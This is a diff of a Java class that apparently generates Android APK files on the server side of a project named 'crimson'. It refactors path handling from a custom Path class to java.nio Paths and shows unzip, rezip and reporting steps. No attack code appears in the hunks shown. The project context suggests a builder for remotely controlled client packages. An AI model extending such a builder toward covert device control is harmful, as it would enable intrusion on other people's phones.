@@ -17,30 +17,28 @@
  *******************************************************************************/
 package subterranean.crimson.server.generation;
 
-
-
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.PrintWriter;
+import java.nio.file.Paths;
 import java.util.ArrayList;
 import java.util.Date;
 
 import subterranean.crimson.server.graphics.BackgroundProgressLights;
 import subterranean.crimson.universal.Logger;
-import subterranean.crimson.universal.Path;
+import subterranean.crimson.universal.ObjectTransfer;
 import subterranean.crimson.universal.Utilities;
 import subterranean.crimson.universal.Zip;
 import subterranean.crimson.universal.containers.Options;
-import subterranean.crimson.universal.objects.ObjectTransfer;
 
 public class APK extends Generator {
 
 	public APK(Options opt, String string, String string2, long l) {
 		options = opt;
-		outPath = new Path(string, string2);
+		outPath = Paths.get(string, string2);
 		report = new ArrayList<String[]>();
 		report.add(new String[] { "Generated:", "Android APK File" });
-		report.add(new String[] { "Output Location:", outPath.getAbsolutePath() });
+		report.add(new String[] { "Output Location:", outPath.toString() });
 
 	}
 
@@ -89,7 +87,7 @@ public class APK extends Generator {
 			}
 
 			// zip the apk back up at the target
-			Zip.zip(unzipped, new File(outPath.getAbsolutePath()));
+			Zip.zip(unzipped, new File(outPath.toString()));
 
 			// remove temp dirs
 			Utilities.delete(root);
@@ -101,7 +99,7 @@ public class APK extends Generator {
 
 			report.add(new String[] { "Generation Time:", time + " seconds" });
 
-			File c = new File(outPath.getAbsolutePath());
+			File c = new File(outPath.toString());
 			boolean suc = c.exists();
 
 			if (suc) {
